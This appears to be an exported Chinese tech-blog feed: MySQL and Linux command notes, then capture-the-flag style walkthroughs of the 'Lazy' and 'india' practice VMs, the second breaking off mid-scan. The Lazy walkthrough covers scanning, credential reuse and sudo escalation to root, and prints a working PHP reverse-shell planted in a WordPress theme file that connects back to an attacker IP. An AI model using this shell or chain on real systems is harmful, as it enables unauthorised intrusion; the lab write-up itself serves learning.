userinfo.uid;</span><br><span class="line"><span class="comment">-- 结果会连在一起</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">-   外连接查询 (__分为左连接和右连接 __)</span><br><span class="line">    </span><br><span class="line">    ```sql</span><br><span class="line">    <span class="comment">-- 1.左连接</span></span><br><span class="line">    <span class="keyword">select</span> * <span class="keyword">from</span> userdata <span class="keyword">left</span> <span class="keyword">join</span> userinfo <span class="keyword">on</span> userdata.udid = userinfo.uid;</span><br><span class="line">    <span class="comment">-- 2.右连接</span></span><br><span class="line">    <span class="keyword">select</span> * <span class="keyword">from</span> userdata <span class="keyword">right</span> <span class="keyword">join</span> userinfo <span class="keyword">on</span> userdata.udid = userinfo.uid;</span><br><span class="line">    <span class="comment">-- 所谓左连接和右连接 无非是用哪个表做参考</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-   联合查询</span><br><span class="line">```sql</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> userdata <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> userinfo</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-   子查询</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span><span class="keyword">sql</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> userdata) <span class="keyword">as</span> newName;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">DISTINCT</span>  * <span class="keyword">from</span> userdata <span class="keyword">where</span> udid <span class="keyword">in</span> (<span class="keyword">select</span> * <span class="keyword">from</span> userinfo);</span><br><span class="line"><span class="comment">-- DISTINCT表示去重的意思</span></span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>​    </p><h2><span id="2-linux下mysql数据导入导出">2. Linux下Mysql数据导入导出</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">首先linux 下查看mysql相关目录</span><br><span class="line">root@ubuntu14:~# whereis mysql</span><br><span class="line">mysql:</span><br><span class="line">/usr/bin/mysql---- mysql的运行路径</span><br><span class="line">/etc/mysql</span><br><span class="line">/usr/lib/mysql----- mysql的安装路径</span><br><span class="line">/usr/bin/X11/mysql</span><br><span class="line">/usr/share/mysql</span><br><span class="line">/usr/share/man/man1/mysql.1.gz</span><br><span class="line">此外还有一个：</span><br><span class="line">var/lib/mysql --------mysql数据库data文件的存放路径</span><br><span class="line"></span><br><span class="line">确定了运行路径，执行导入、导出mysql数据库命令</span><br><span class="line">一、导出数据库用mysqldump命令</span><br><span class="line">（注意:先cd到mysql的运行路径下，再执行一下命令）：</span><br><span class="line">1、导出数据和表结构：</span><br><span class="line">mysqldump -u用户名 -p密码 数据库名 &gt; 数据库名.sql</span><br><span class="line">mysqldump -uroot -p dbname &gt; dbname .sql</span><br><span class="line">敲回车后会提示输入密码</span><br><span class="line">2、只导出表结构</span><br><span class="line">mysqldump -u用户名 -p密码 -d 数据库名 &gt; 数据库名.sql</span><br><span class="line">mysqldump -uroot -p -d dbname &gt; dbname .sql</span><br><span class="line"></span><br><span class="line">二、导入数据库</span><br><span class="line">1、首先建空数据库</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash">create database dbname ;</span></span><br><span class="line">2、导入数据库</span><br><span class="line">方法一：</span><br><span class="line">（1）选择数据库</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash">use dbname ;</span></span><br><span class="line">（2）设置数据库编码</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"><span class="built_in">set</span> names utf8;</span></span><br><span class="line">（3）导入数据（注意sql文件的路径）</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"><span class="built_in">source</span> /home/xxxx/dbname .sql;</span></span><br><span class="line">方法二：</span><br><span class="line">mysql -u用户名 -p密码 数据库名 &lt; 数据库名.sql</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#mysql&quot;&gt;MySQL&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-mysql外键&quot;&gt;1. Mysql外键&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-外键设计&quot;&gt;1. 外键设计&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-数据操作&quot;&gt;2. 数据操作&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-linux下mysql数据导入导出&quot;&gt;2. Linux下Mysql数据导入导出&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="MySQL" scheme="https://atc96.top/categories/MySQL/"/>
    
    
      <category term="MySQL" scheme="https://atc96.top/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>linux相关配置和操作</title>
    <link href="https://atc96.top/linux/"/>
    <id>https://atc96.top/linux/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2020-05-10T11:29:58.494Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#linux相关配置和操作">linux相关配置和操作</a><ul><li><a href="#1-常见命令">1. 常见命令</a></li><li><a href="#2-lamp安装和配置">2. LAMP安装和配置</a></li><li><a href="#3-linux用户操作">3. LINUX用户操作</a></li><li><a href="#4-linux启动级别">4. linux启动级别</a></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="linux相关配置和操作">linux相关配置和操作</span></h1><h2><span id="1-常见命令">1. 常见命令</span></h2><ul><li><ol><li>tar</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#打包</span></span><br><span class="line">tar -zcvf FileName.tar dirName</span><br><span class="line"><span class="comment">#解包</span></span><br><span class="line">tar -zxvf FileName.tar</span><br></pre></td></tr></table></figure></li><li><ol start="2"><li>unzip</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip [-o 覆盖 |-n 不覆盖] FileName.zip [-d Dirname 指定位置] #解压</span><br></pre></td></tr></table></figure></li></ul><h2><span id="2-lamp安装和配置">2. LAMP安装和配置</span></h2><ul><li><ol><li>安装</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update              # 获取最新资源包</span><br><span class="line">sudo tasksel install lamp-server #安装lamp</span><br><span class="line">sudo tasksel remove lamp-server  #一键卸载lamp</span><br></pre></td></tr></table></figure></li></ul><h2><span id="3-linux用户操作">3.  LINUX用户操作</span></h2><ul><li><strong>添加用户组</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd groupname</span><br></pre></td></tr></table></figure><ul><li><strong>添加用户</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">useradd username -m -s /bin/bash -d /home/username -g groupname</span><br><span class="line"></span><br><span class="line"><span class="comment">#参数说明：</span></span><br><span class="line">-s /sbin/nologin设置不能登陆-s /bin/<span class="literal">false</span>(老方法) 也行</span><br><span class="line">-d 设置用户主目录</span><br><span class="line">-g 用户组</span><br><span class="line">-m 创建用户目录</span><br></pre></td></tr></table></figure><ul><li><strong>更改用户登录权限</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加用户登录权限</span></span><br><span class="line">usermod -s /bin/bash username</span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁用用户登录权限</span></span><br><span class="line">usermod -s /sbin/nologin username</span><br></pre></td></tr></table></figure><ul><li><strong>设置密码</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passwd username</span><br><span class="line"><span class="comment"># enter password:....</span></span><br></pre></td></tr></table></figure><ul><li>删除用户</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userdel username</span><br></pre></td></tr></table></figure><h2><span id="4-linux启动级别">4. linux启动级别</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">init0-6（启动级别）</span><br><span class="line">一. init是Linux系统操作中不可缺少的程序之一。</span><br><span class="line">　　所谓的init进程，它是一个由内核启动的用户级进程。</span><br><span class="line">　　内核自行启动（已经被载入内存，开始运行，并已初始化所有的设备驱动程序和数据结构等）之后，就通过启动一个用户级程序init的方式，完成引导进程。所以,init始终是第一个进程（其进程编号始终为1）。</span><br><span class="line">　　内核会在过去曾使用过init的几个地方查找它，它的正确位置（对Linux系统来说）是/sbin/init。如果内核找不到init，它就会试着运行/bin/sh，如果运行失败，系统的启动也会失败。</span><br><span class="line">二. init一共分为7个级别，这7个级别的所代表的含义如下</span><br><span class="line">0：停机或者关机（千万不能将initdefault设置为0）</span><br><span class="line">1：单用户模式，只root用户进行维护</span><br><span class="line">2：多用户模式，不能使用NFS(Net File System)</span><br><span class="line">3：完全多用户模式（标准的运行级别）</span><br><span class="line">4：安全模式</span><br><span class="line">5：图形化（即图形界面）</span><br><span class="line">6：重启（千万不要把initdefault设置为6）</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#linux相关配置和操作&quot;&gt;linux相关配置和操作&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-常见命令&quot;&gt;1. 常见命令&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-lamp安装和配置&quot;&gt;2. LAMP安装和配置&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3-linux用户操作&quot;&gt;3. LINUX用户操作&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#4-linux启动级别&quot;&gt;4. linux启动级别&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="LINUX" scheme="https://atc96.top/categories/LINUX/"/>
    
    
      <category term="LINUX" scheme="https://atc96.top/tags/LINUX/"/>
    
  </entry>
  
  <entry>
    <title>Lazy 靶机渗透</title>
    <link href="https://atc96.top/lazy/"/>
    <id>https://atc96.top/lazy/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2020-05-10T11:10:42.920Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#lazy靶机渗透">Lazy靶机渗透</a><ul><li><a href="#1-渗透过程">1. 渗透过程</a></li><li><a href="#2-重要信息">2. 重要信息</a></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="lazy靶机渗透">Lazy靶机渗透</span></h1><h2><span id="1-渗透过程">1. 渗透过程</span></h2><ul><li><p>话不多少说开始搜集信息：</p></li><li><p>这里使用 <code>netdiscover</code> : <code>netdiscover -i eth0 -r 192.168.0.0/24</code></p></li><li><p>发现一条</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.110   00:0c:29:b8:5f:5f      1      60  VMware, Inc.</span><br></pre></td></tr></table></figure></li><li><p>使用nmap进一步探测端口 <code>nmap -sS 192.168.0.110 -oN /tmp/r.txt</code></p></li><li><p>扫描结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Host is up (0.00022s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">6667/tcp open  irc</span><br><span class="line">MAC Address: 00:0C:29:B8:5F:5F (VMware)</span><br><span class="line"><span class="comment">#后来用 nmap -v -A 192.168.0.110 扫面出</span></span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br></pre></td></tr></table></figure></li><li><p>80肯定是web，139和445都是Samba</p></li><li><p>我们先用nikto 扫面一下web，再试试Samba能不能连接</p></li><li><p><code>nikto -host http://192.168.0.110/ -o /tmp/r.html</code></p></li><li><p>我用kali里面的连接网络文件夹输入 <code>smb://192.168.0.110</code></p></li><li><p>发现有两个文件夹一个是 <code>$print</code> 另一个是 <code>$share</code> 发现第一个需要密码，第二个可以匿名访问</p></li><li><p>进去看看，都是一代码</p></li><li><p>还找到一个文件 <code>deets.txt</code> 内容是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CBF Remembering all these passwords.</span><br><span class="line"></span><br><span class="line">Remember to remove this file and update your password after we push out the server.</span><br><span class="line"></span><br><span class="line">Password 12345</span><br><span class="line"></span><br><span class="line">CBF记住所有这些密码。</span><br><span class="line">请记住在我们推出服务器后删除此文件并更新您的密码。</span><br><span class="line">密码12345</span><br></pre></td></tr></table></figure></li><li><p>发现一个服务器默认的密码 <code>12345</code></p></li><li><p>这时候我们在看nikto扫描的结果：</p></li><li><p>发现网站是<code>wordpress</code>框架，还有<code>phpmyadmin</code>的地址…</p></li><li><p>进到wordpress之后发现只有一篇文章，都是这句话<code>My name is togie.</code></p></li><li><p>这可能是某个用户名</p></li><li><p>这些相关的目录在<code>$share</code>都有那我们直接找<code>wordpress</code>的后台地址：<code>wp-admin</code></p></li><li><p>还在 <code>wp-config.php</code>找到了mysql的账号密码 <code>Admin ：TogieMYSQL12345^^</code></p></li><li><p>而且nikto还扫描到 <code>phpmyadmin</code>的地址，登进去看看，发现没有select权限，</p></li><li><p>那我们进去<code>wp-admin</code>看看也需要密码，咋办没密码呀，数据库也进不去，那就试试mysql的密码吧</p></li><li><p>发现mysql的密码竟然和 <code>wordpress</code>的账号密码是一样</p></li><li><p>进后台之后，查到可以修改主题的源代码，那我们就修改<code>404.php</code> 给了一个反弹shell的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    $ip=<span class="string">'192.168.0.21'</span>;</span><br><span class="line">    $port=<span class="string">'20096'</span>;</span><br><span class="line">    $fp=@fsockopen($ip,$port,$errno,$errstr);</span><br><span class="line">    <span class="keyword">if</span>(!$fp)&#123; <span class="keyword">echo</span> <span class="string">"error"</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    fputs($fp,<span class="string">"\nconnect success\n"</span>);</span><br><span class="line">    <span class="keyword">while</span> (!feof($fp)) &#123;</span><br><span class="line">    fputs($fp,<span class="string">"shell:"</span>);</span><br><span class="line">    $shell=fgets($fp);</span><br><span class="line">    $message=`$shell`;</span><br><span class="line">    fputs($fp,$message);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>然后nc监听一下，激活主题并且访问一个不存在的帖子</p></li><li><p><code>http://192.168.0.110/wordpress/?p=-1</code></p></li><li><p>nc就弹回一个 <code>www-dada</code> 的shell</p></li><li><p>然后我们查看 <code>/etc/passwd</code>文件发现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">togie:x:1000:1000:togie,,,:/home/togie:/bin/rbash</span><br></pre></td></tr></table></figure></li><li><p>哈？这不就是之前说的那个可能的用户名嘛</p></li><li><p>然后服务器默认的密码 <code>12345</code>，那我们试试ssh能不能给他连上了</p></li><li><p>kali输入命令 ： <code>ssh togie@192.168.0.110</code>给我来一一段这样的话？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#############################################################################</span></span><br><span class="line"><span class="comment">#              Welcome to Web_TR1                                  #</span></span><br><span class="line"><span class="comment">#            All connections are monitored and recorded                     #    </span></span><br><span class="line"><span class="comment">#          Disconnect IMMEDIATELY if you are not an authorized user!        #     </span></span><br><span class="line"><span class="comment">#############################################################################</span></span><br><span class="line">togie@192.168.0.110<span class="string">'s password:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1. 欢迎使用Web目录1</span></span><br><span class="line"><span class="string">2. 所有连接都被监视和记录</span></span><br><span class="line"><span class="string">3. 如果您不是授权用户，请立即断开连接！</span></span><br></pre></td></tr></table></figure></li><li><p>哈？ 吓我呢？</p></li><li><p>试试密码，进去了，哈哈哈~</p></li><li><p>走一下三部曲</p></li><li><p><code>ls -al ~/</code></p></li><li><p>发现没啥</p></li><li><p><code>crontab -l</code></p></li><li><p>也没啥</p></li><li><p><code>history</code></p></li><li><p>也没啥~</p></li><li><p>然后我加一个第四部曲</p></li><li><p><code>sudo -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User togie may run the following commands on LazySysAdmin:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">用户togie可以在lazysadmin上运行以下命令：</span><br><span class="line">（全部：全部）全部</span><br></pre></td></tr></table></figure></li><li><p>那还说什么 直接就是root权限了</p></li><li><p>直接 <code>sudo passwd root</code></p></li><li><p>root不就来了嘛</p></li><li><p>root用户下看到一个 <code>proof.txt</code></p></li><li><p>内容是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT9851</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Well done :)</span><br><span class="line"></span><br><span class="line">Hope you learn't a few things along the way.</span><br><span class="line"></span><br><span class="line">Regards,</span><br><span class="line"></span><br><span class="line">Togie Mcdogie</span><br><span class="line"></span><br><span class="line">Enjoy some random strings</span><br><span class="line"></span><br><span class="line">WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT9851</span><br><span class="line"><span class="meta">2d2v#</span><span class="bash">X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1<span class="variable">$#slTET7</span></span></span><br><span class="line"><span class="meta">pf%</span><span class="bash">&amp;1nRpaj^68ZeV2St9GkdoDkj48Fl<span class="variable">$MI97Zt2nebt02</span></span></span><br><span class="line">bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu</span><br></pre></td></tr></table></figure></li><li><p><strong>WELL_DONE!!!</strong></p></li></ul><h2><span id="2-重要信息">2. 重要信息</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. phpmyadmin地址</span></span><br><span class="line">http://192.168.0.110/phpmyadmin/</span><br><span class="line"><span class="comment"># 2. wordpress管理后台</span></span><br><span class="line">http://192.168.0.110/wordpress/wp-admin</span><br><span class="line"><span class="comment"># 3. mysql账号密码：</span></span><br><span class="line">Admin ：TogieMYSQL12345^^ （也是wordpress管理后台的账号密码）</span><br><span class="line"><span class="comment"># 4. ssh账号密码：</span></span><br><span class="line">togie ：12345</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#lazy靶机渗透&quot;&gt;Lazy靶机渗透&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-渗透过程&quot;&gt;1. 渗透过程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-重要信息&quot;&gt;2. 重要信息&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://atc96.top/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="网络渗透" scheme="https://atc96.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>india 靶机渗透</title>
    <link href="https://atc96.top/india/"/>
    <id>https://atc96.top/india/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2020-05-10T11:09:35.937Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#india靶机渗透">india靶机渗透</a><ul><li><a href="#1渗透过程">1.渗透过程</a></li><li><a href="#2-重要信息">2. 重要信息</a><ul><li><a href="#a数据库账号密码">a.数据库账号密码</a></li><li><a href="#b网页登录密码">b.网页登录密码</a></li></ul></li><li><a href="#3总结">3.总结</a></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="india靶机渗透">india靶机渗透</span></h1><h2><span id="1渗透过程">1.渗透过程</span></h2><ul><li><p>扫描局域网<code>apr-scan  --interface=eth0 192.168.0.1/24</code></p></li><li><p>找到IP地址<code>192.168.0.104</code></p></li><li><p>找ip开放的端口<code>nmap -v -A -oN /tmp/india.txt 192.168.0.104</code></p></li><li><p>扫描结果：</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Nmap 7.70 scan initiated Sun Apr 19 14:38:31 2020 as: nmap -v -A -oN /tmp/122.txt 192.168.0.104</span></span><br><span class="line">Nmap scan report for 192.168.0.104</span><br><span class="line">Host is up (0.00043s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 fa:cf:a2:52:c4:fa:f5:75:a7:e2:bd:60:83:3e:7b:de (DSA)</span><br><span class="line">|   2048 88:31:0c:78:98:80:ef:33:fa:26:22:ed:d0:9b:ba:f8 (RSA)</span><br><span class="line">|_  256 0e:5e:33:03:50:c9:1e:b3:e7:51:39:a4:4a:10:64:ca (ECDSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Ubuntu)</span><br><span class="line">|_http-title: --==[[IndiShell Lab]]==--</span><br><span class="line">MAC Address: 00:0C:29:A1:E2:DF (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.002 days (since Sun Apr 19 14:35:37 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty=263 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.43 ms 192.168.0.104</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="meta">#</span><span class="bash"> Nmap <span class="keyword">done</span> at Sun Apr 19 14:38:40 2020 -- 1 IP address (1 host up) scanned <span class="keyword">in</span> 9.01 seconds</span></span><br></pre></td></tr></table></figure><ul><li><p>发现只有开放了两个端口：<code>22和80</code></p></li><li><p>去看看web:</p></li><li><p>发现只有一个登录框</p></li><li><p>先试试sql注入：</p></li><li><p>使用sqlmap：<code>sqlmap -u 192.168.0.104 --data=&quot;un=123&amp;ps=123&amp;login=let%27s+login&quot; --level=3</code></p></li><li><p>结果:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">all tested parameters <span class="keyword">do</span> not appear to be injectable. Try to increase values <span class="keyword">for</span> <span class="string">'--level'</span>/<span class="string">'--risk'</span> options <span class="keyword">if</span> you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. 